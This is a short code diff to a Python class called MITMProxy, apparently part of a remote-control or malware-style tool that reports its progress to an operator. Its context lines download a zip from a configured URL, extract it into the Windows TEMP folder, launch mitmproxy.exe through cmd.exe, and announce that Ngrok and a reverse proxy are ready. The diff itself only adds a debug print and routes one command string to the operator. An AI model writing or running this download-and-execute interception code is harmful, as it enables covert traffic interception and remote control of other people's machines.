@@ -34,6 +34,7 @@ class MITMProxy():
 		self.SendMessage(" Ngrok Executed.")
 
 	def MITM_Proxy(self):
+		print(111111)
 		self.SendMessage(" Donwloading MITMF...")
 		req = requests.get(self.mitmfproxy)
 		
@@ -43,7 +44,7 @@ class MITMProxy():
 		file.close()
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
-		print(" ".join(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"]))
+		self.SendMessage(" ".join(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"]))
 		Popen(["cmd.exe","/c",os.environ['TEMP'] + "\\mitmfproxy\\mitmproxy.exe"],shell=True)
 		self.SendMessage(" MITMProxy Executed.")
 		self.SendMessage(" Reverse Proxy Ready.")
